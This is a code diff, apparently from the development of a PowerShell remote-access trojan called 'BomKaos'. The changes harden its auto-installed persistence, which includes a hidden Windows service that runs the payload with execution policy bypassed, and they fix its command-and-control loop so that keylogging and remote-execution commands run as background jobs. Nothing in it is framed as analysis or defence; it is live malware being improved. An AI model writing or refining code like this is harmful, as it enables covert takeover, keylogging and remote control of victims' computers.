@@ -992,15 +992,19 @@ IconIndex=0" | Set-Content -Path $lnkPath -Force
     
     # Method 8: Windows Service
     try {
-        $svcPath = Join-Path $C2.InstallDir "BomKaosSvc.ps1"
-        if (-not (Test-Path $C2.InstallDir)) { New-Item -ItemType Directory -Path $C2.InstallDir -Force | Out-Null }
-        Copy-Item $PayloadPath $svcPath -Force
-        
-        # Create a service that launches PowerShell
-        $svcName = "BomKaosHelper"
-        New-Service -Name $svcName -BinaryPathName "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$svcPath`"" -DisplayName "BomKaos Helper Service" -StartupType Automatic -ErrorAction SilentlyContinue
-        Start-Service $svcName -ErrorAction SilentlyContinue
-        $results += @{Method = "WindowsService"; Status = "Success" }
+        if ($PayloadPath -and (Test-Path $PayloadPath)) {
+            $svcPath = Join-Path $C2.InstallDir "BomKaosSvc.ps1"
+            if (-not (Test-Path $C2.InstallDir)) { New-Item -ItemType Directory -Path $C2.InstallDir -Force | Out-Null }
+            Copy-Item $PayloadPath $svcPath -Force
+            
+            # Create a service that launches PowerShell
+            $svcName = "BomKaosHelper"
+            New-Service -Name $svcName -BinaryPathName "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$svcPath`"" -DisplayName "BomKaos Helper Service" -StartupType Automatic -ErrorAction SilentlyContinue
+            Start-Service $svcName -ErrorAction SilentlyContinue
+            $results += @{Method = "WindowsService"; Status = "Success" }
+        } else {
+            $results += @{Method = "WindowsService"; Status = "Skipped-NoSourceFile" }
+        }
     }
     catch { $results += @{Method = "WindowsService"; Status = "Failed"; Error = $_.Exception.Message } }
     
@@ -1779,10 +1783,13 @@ public static extern IntPtr GetConsoleWindow();
     # Create install directory
     if (-not (Test-Path $C2.InstallDir)) { New-Item -ItemType Directory -Path $C2.InstallDir -Force | Out-Null }
     
-    # Auto-Install Persistence
-    $currentPath = $MyInvocation.MyCommand.Path
-    if (-not $currentPath) { $currentPath = Join-Path $C2.InstallDir "BomKaosKaki.ps1" }
-    Install-Persistence -PayloadPath $currentPath | Out-Null
+    # Auto-Install Persistence — resolve path with multiple fallbacks
+    $currentPath = $PSCommandPath
+    if (-not $currentPath) { $currentPath = $MyInvocation.MyCommand.Path }
+    if (-not $currentPath) { $currentPath = $MyInvocation.ScriptName }
+    if ($currentPath -and (Test-Path $currentPath)) {
+        Install-Persistence -PayloadPath $currentPath | Out-Null
+    }
     
     # Initial heartbeat
     Send-Heartbeat
@@ -1796,7 +1803,7 @@ public static extern IntPtr GetConsoleWindow();
             if ($response -and $response.commands) {
                 foreach ($cmd in $response.commands) {
                     # Execute command in background job for long-running tasks
-                    if ($cmd.command -in @('keylog_start', 'exec', 'exec_powershell')) {
+                    if ($cmd.command_type -in @('keylog_start', 'exec', 'exec_powershell')) {
                         Start-Job -ScriptBlock {
                             param($c, $d)
                             Invoke-CommandDispatcher -Command $c
